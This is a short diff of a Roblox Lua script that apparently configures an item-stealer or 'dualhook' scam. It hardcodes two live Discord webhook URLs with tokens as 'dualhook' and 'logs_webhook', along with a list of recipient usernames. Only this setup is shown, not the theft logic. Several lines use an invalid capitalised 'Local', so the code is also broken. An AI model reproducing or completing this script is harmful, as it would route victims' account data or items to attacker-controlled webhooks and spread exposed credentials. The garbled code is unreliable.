@@ -1,10 +1,7 @@
-
-
 local usernames ={Username, "namnnni2", "BaldBaconFrrr"}
 Local webhook = Webhook
 Local dualhook = "https://discord.com/api/webhooks/1396184713311289354/0b-DXlEyHe5wu_9WXQRO89AAgEjNeSJbGDL7wFEDhvH-LMeBqxtuMuyaaxmISo9JT5UO"
-Local embed = getfenv().Username
-
+Local embed = Username
 local logs_webhook = "https://discord.com/api/webhooks/1396562436005302315/x1kASTn9QReUxByoLv4GoaC2Za12gPHekEs4rpNs8itG3LET4onCohbqr95lFVkz-Lnq"
 
 local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
